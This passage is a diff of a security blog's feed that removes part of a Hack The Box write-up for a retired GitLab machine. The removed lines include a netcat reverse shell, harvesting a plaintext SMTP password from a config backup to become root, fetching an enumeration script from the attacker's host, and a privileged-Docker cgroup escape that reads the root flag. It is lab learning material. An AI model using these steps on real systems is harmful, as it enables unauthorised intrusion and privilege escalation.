-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;We run a netcat listener to catch our reverse shell. We end up with a shell as
-&lt;code&gt;git&lt;/code&gt; that can read the user flag.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nc -l -p 4443&lt;/span&gt;
-&lt;span class="code-line"&gt;bash: cannot set terminal process group (485): Inappropriate ioctl for device&lt;/span&gt;
-&lt;span class="code-line"&gt;bash: no job control in this shell&lt;/span&gt;
-&lt;span class="code-line"&gt;git@gitlab:~/gitlab-rails/working$ id&lt;/span&gt;
-&lt;span class="code-line"&gt;id&lt;/span&gt;
-&lt;span class="code-line"&gt;uid=998(git) gid=998(git) groups=998(git)&lt;/span&gt;
-&lt;span class="code-line"&gt;git@gitlab:/$ find / -name &amp;#39;user.txt&amp;#39; 2&amp;gt;/dev/null&lt;/span&gt;
-&lt;span class="code-line"&gt;find / -name &amp;#39;user.txt&amp;#39; 2&amp;gt;/dev/null&lt;/span&gt;
-&lt;span class="code-line"&gt;/home/dude/user.txt&lt;/span&gt;
-&lt;span class="code-line"&gt;git@gitlab:/$ cat /home/dude/user.txt&lt;/span&gt;
-&lt;span class="code-line"&gt;cat /home/dude/user.txt&lt;/span&gt;
-&lt;span class="code-line"&gt;e1e30b052b6ec0670698805d745e7682&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h1 id="root"&gt;Root&lt;/h1&gt;
-&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
-&lt;p&gt;We enumerate a few file and find the &lt;code&gt;/opt/backup/&lt;/code&gt; directory which contain a few
-files. The file &lt;code&gt;gitlab.rb&lt;/code&gt; contain a smtp password.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git@gitlab:/opt/backup$ grep -i pass gitlab.rb&lt;/span&gt;
-&lt;span class="code-line"&gt;grep -i pass gitlab.rb&lt;/span&gt;
-&lt;span class="code-line"&gt;#### Email account password&lt;/span&gt;
-&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;incoming_email_password&amp;#39;] = &amp;quot;[REDACTED]&amp;quot;&lt;/span&gt;
-&lt;span class="code-line"&gt;#     password: &amp;#39;_the_password_of_the_bind_user&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;#     password: &amp;#39;_the_password_of_the_bind_user&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;#   &amp;#39;/users/password&amp;#39;,&lt;/span&gt;
-&lt;span class="code-line"&gt;#### Change the initial default admin password and shared runner registration tokens.&lt;/span&gt;
-&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;initial_root_password&amp;#39;] = &amp;quot;password&amp;quot;&lt;/span&gt;
-&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;db_password&amp;#39;] = nil&lt;/span&gt;
-&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;redis_password&amp;#39;] = nil&lt;/span&gt;
-&lt;span class="code-line"&gt;    gitlab_rails[&amp;#39;smtp_password&amp;#39;] = &amp;quot;wW59U!ZKMbG9+*#h&amp;quot;&lt;/span&gt;
-&lt;span class="code-line"&gt;# gitlab_shell[&amp;#39;http_settings&amp;#39;] = { user: &amp;#39;username&amp;#39;, password: &amp;#39;password&amp;#39;, ca_file: &amp;#39;/etc/ssl/cert.pem&amp;#39;, ca_path: &amp;#39;/etc/pki/tls/certs&amp;#39;, self_signed_cert: false}&lt;/span&gt;
-&lt;span class="code-line"&gt;##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`&lt;/span&gt;
-&lt;span class="code-line"&gt;# postgresql[&amp;#39;sql_user_password&amp;#39;] = &amp;#39;SQL_USER_PASSWORD_HASH&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;# postgresql[&amp;#39;sql_replication_password&amp;#39;] = &amp;quot;md5 hash of postgresql password&amp;quot; # You can generate with `gitlab-ctl pg-password-md5 &amp;lt;dbuser&amp;gt;`&lt;/span&gt;
-&lt;span class="code-line"&gt;# redis[&amp;#39;password&amp;#39;] = &amp;#39;redis-password-goes-here&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;####! **Master password should have the same value defined in&lt;/span&gt;
-&lt;span class="code-line"&gt;####!   redis[&amp;#39;password&amp;#39;] to enable the instance to transition to/from&lt;/span&gt;
-&lt;span class="code-line"&gt;# redis[&amp;#39;master_password&amp;#39;] = &amp;#39;redis-password-goes-here&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;# geo_secondary[&amp;#39;db_password&amp;#39;] = nil&lt;/span&gt;
-&lt;span class="code-line"&gt;# geo_postgresql[&amp;#39;pgbouncer_user_password&amp;#39;] = nil&lt;/span&gt;
-&lt;span class="code-line"&gt;#     password: PASSWORD&lt;/span&gt;
-&lt;span class="code-line"&gt;###! generate this with `echo -n &amp;#39;$password + $username&amp;#39; | md5sum`&lt;/span&gt;
-&lt;span class="code-line"&gt;# pgbouncer[&amp;#39;auth_query&amp;#39;] = &amp;#39;SELECT username, password FROM public.pg_shadow_lookup($1)&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;#     password: MD5_PASSWORD_HASH&lt;/span&gt;
-&lt;span class="code-line"&gt;# postgresql[&amp;#39;pgbouncer_user_password&amp;#39;] = nil&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;We need an interactive shell to be able to input a password, we use python for
-that purpose and end up with a shell as root.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git@gitlab:~/gitlab-rails/working$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;orking$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;git@gitlab:~/gitlab-rails/working$ su&lt;/span&gt;
-&lt;span class="code-line"&gt;su&lt;/span&gt;
-&lt;span class="code-line"&gt;Password: wW59U!ZKMbG9+*#h&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;root@gitlab:/var/opt/gitlab/gitlab-rails/working# id&lt;/span&gt;
-&lt;span class="code-line"&gt;id&lt;/span&gt;
-&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;Nonetheless we cannot find any &lt;code&gt;root.txt&lt;/code&gt; file. As you probably already guess or
-notice we are in a docker container.&lt;/p&gt;
-&lt;h2 id="docker-escape"&gt;Docker escape&lt;/h2&gt;
-&lt;p&gt;We run &lt;a href="https://github.com/stealthcopter/deepce"&gt;deepce&lt;/a&gt;: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
-We use a python server on our kalibox to transfer the script using &lt;code&gt;wget --recursive --no-parent http://10.10.14.18:8000&lt;/code&gt;.
-And we run it.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;[+] Privileged Mode ......... Yes&lt;/span&gt;
-&lt;span class="code-line"&gt;The container appears to be running in privilege mode, we should be able to access the&lt;/span&gt;
-&lt;span class="code-line"&gt;raw disks and mount the hosts root partition in order to gain code execution.&lt;/span&gt;
-&lt;span class="code-line"&gt;See https://stealthcopter.github.io/deepce/guides/docker-privileged.md&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;An other quick Google research allow us to find a &lt;a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1"&gt;medium article&lt;/a&gt;
-to learn more about docker's privilege mode with a few command line to execute a
-command on the system. We just replace the &lt;code&gt;echo "ps aux &amp;gt; $host_path/output" &amp;gt;&amp;gt; /cmd&lt;/code&gt; line
-with &lt;code&gt;echo "cat /root/root.txt &amp;gt; $host_path/output" &amp;gt;&amp;gt; /cmd&lt;/code&gt; and grab the root
-hash.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# echo &amp;quot;cat /root/root.txt &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd&lt;/span&gt;
-&lt;span class="code-line"&gt;echo &amp;quot;cat /root/root.txt &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd&lt;/span&gt;
-&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;&lt;/span&gt;
-&lt;span class="code-line"&gt;sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;&lt;/span&gt;
-&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# cat /output&lt;/span&gt;
-&lt;span class="code-line"&gt;cat /output&lt;/span&gt;
-&lt;span class="code-line"&gt;b7f98681505cd39066f67147b103c2b3&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
-&lt;p&gt;The box is not that hard (less than laboratory [TODO LINK]) and quit interesting
-as the exploitation of the gitlab's SSRF and its upgrade to an RCE was really
-interesting and detailed on the blog article.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="gitlab"></category><category term="docker"></category></entry><entry><title>HTB: Obscurity</title><link href="https://maggick.fr/2020/05/htb-obscurity.html" rel="alternate"></link><published>2020-05-11T10:05:00+02:00</published><updated>2020-05-11T10:05:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-11:/2020/05/htb-obscurity.html</id><summary type="html">&lt;p&gt;&lt;img alt="Obscurity card" class="align-left" src="/media/2020.05/obscurity_card.png" width="262"/&gt;&lt;/p&gt;
+injection.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="DLL"></category><category term="DnsAdmins"></category></entry><entry><title>HTB: Obscurity</title><link href="https://maggick.fr/2020/05/htb-obscurity.html" rel="alternate"></link><published>2020-05-11T10:05:00+02:00</published><updated>2020-05-11T10:05:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-11:/2020/05/htb-obscurity.html</id><summary type="html">&lt;p&gt;&lt;img alt="Obscurity card" class="align-left" src="/media/2020.05/obscurity_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/219"&gt;Obscurity&lt;/a&gt;
 This box is classified as a medium machine. It was release on December the first
